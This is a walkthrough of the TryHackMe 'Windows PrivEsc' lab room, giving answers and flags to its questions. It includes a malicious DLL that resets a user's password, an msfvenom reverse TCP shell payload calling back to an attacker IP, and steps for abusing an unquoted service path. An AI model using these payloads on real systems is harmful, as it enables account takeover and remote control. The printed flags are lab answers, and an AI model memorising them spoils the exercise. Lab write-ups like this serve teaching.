---
description: 'This is my walkthrough for the TryHackMe Room: Windows PrivEsc.'
---

# Windows PrivEsc

This room can be found [here](https://tryhackme.com/room/winprivesc). This room covers a few methods of escalating from a normal user to the root user on a system.

## Task 2

### Question 2: List users on the target system. One of them resembles a flag.

`THM-17213` - Running `net users` will give us our answer

![](<../../../.gitbook/assets/image (378).png>)

### Question 3: What is the OS version of the target machine?

`10.0.17763 N/A Build 17763` - Running `systeminfo` will give us our answer

![](<../../../.gitbook/assets/image (49).png>)

### Question 4: When was security update KB4562562 installed?

`6/10/2020` - Following the command the room gives, `wmic qfe get Caption,Description,HotFixID,InstalledOn` but piping in the string we want to find will make this MUCH easier. `wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr "KB4562562"`

![](<../../../.gitbook/assets/image (236).png>)

### Question 5: What is the state of Windows Defender?

`STOPPED` - Running `sc query windefend` will give us our answer

![](<../../../.gitbook/assets/image (284).png>)

## Task 4

### Question 1: What version of a Fitbit application can you see installed?

`2.0.1.6782` - Following the example command the room gives us but piping to search will help.

`wmic product get name,version,vendor | findstr "Fitbit"`

### Question 2: What kind of vulnerability seems to affect the Fitbit application?

`Unquoted Service Path` - Having to do some minor research on this one, when going to Exploit.db we can search for "Fitbit" and find [this link](https://www.exploit-db.com/exploits/40482) which give us our answer.

### Question 3: What version of FoxitReader is installed on the target system?

`9.0.1.1049` - I admittedly had to go through the explorer via GUI to find this.

![](<../../../.gitbook/assets/image (388).png>)

## Task 5

First we are asked to replicate the attacks the room explained. So it asks us to create to malicious DLL file, and use it to modify the password for the user Jack so we can login as him.

```
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net user Jack Passwors123");
        ExitProcess(0);
    }
    return TRUE;
}
```

We add the above code into a .c file then we can compile it.

`x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`

![](<../../../.gitbook/assets/image (68).png>)

Now we get the file onto the machine via whatever means we can. I'll be adding it by using a simple python web server. `python3 -m http.server` onmy attacker machine.

![](<../../../.gitbook/assets/image (111).png>)

Now we stop and start the DLL service with: `sc stop dllsvc` followed by `sc start dllsvc`

![](<../../../.gitbook/assets/image (118).png>)

### Question 3: Login with Jack's account (the new password you have set). What is the content of the flagdll.txt file?

`THM-8377492093` - Now that we have changed Jacks password, we can switch to his user via commandline or remote desktop in. I went with commandline and just opened up powershell as jack.

![](<../../../.gitbook/assets/image (169).png>)

Now we find the file: `Get-ChildItem -Path C:\ -Recurse -File flagdll.txt -ErrorAction SilentlyContinue`

![](<../../../.gitbook/assets/image (385).png>)

Then we get the file contents: `Get-Content 'C:\Users\jack\Documents\flagdll.txt'`

![](<../../../.gitbook/assets/image (186).png>)

## Task 6

### Question 1: What is the full unquoted path of unquotedsvc

`C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe` - So as the room suggests we can run `wmic service get name,displayname,pathname,startmode` but we can pip ewith `findstr` to make our search easier. `wmic service get name,displayname,pathname,startmode | findstr "unquotedsvc"`

![](<../../../.gitbook/assets/image (387).png>)

### Question 2: Go through subfolders in the unquotedsvc binary path. Which folder does the user have read and write privileges on?

`C:\Program Files\Unquoted Path Service\` - As the room tells us, accesschk64.exe is on the desktop, so running .\accesschk64.exe /accepteula -uwdq "C:\Program Files\\`Unquoted Path Service\"` We see our answer. We can write into the base directory of that.

![](<../../../.gitbook/assets/image (217).png>)

### Question 3: What would be the name of the executable you would place in that folder?

`common.exe` - I had to look this up as I found no clear indicator as why this file had to be named this

### Question 4: Obtain Administrator privileges on the target machine. What is the content of the flagUSP.txt file?

`THM-636729273483` - The room gives us an example payload to create a file to upload to the system. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.68.77 LPORT=4444 -f exe > common.exe`

![](<../../../.gitbook/assets/image (176).png>)

Now we start metasploit and get our listener ready `msfconsole -q`

![](<../../../.gitbook/assets/image (181).png>)

We can follow the rooms example just be sure to change the IP and PORT of YOUR machine you used when making the payload.

We get the file onto the target in whatever way we can, I'll again be using python3 webserver

![](<../../../.gitbook/assets/image (20).png>)

With our file now on the target, we can start the service `sc start unquotedsvc`

![](<../../../.gitbook/assets/image (182).png>)

We should now have our shell

![](<../../../.gitbook/assets/image (131).png>)

From here there are multiple ways we can find our file and flag but for the sake of brevity we will just stick with windows and methods we have already used.

We'll move to powershell with `powershell.exe`, then find the file we want, `Get-ChildItem -Path C:\ -Recurse -File flagUSP.txt -ErrorAction SilentlyContinue`,  then get the contents of the file, `Get-Content 'C:\Users\Cora\Documents\flagUSP.txt'`

![](<../../../.gitbook/assets/image (360).png>)

![](<../../../.gitbook/assets/image (352).png>)
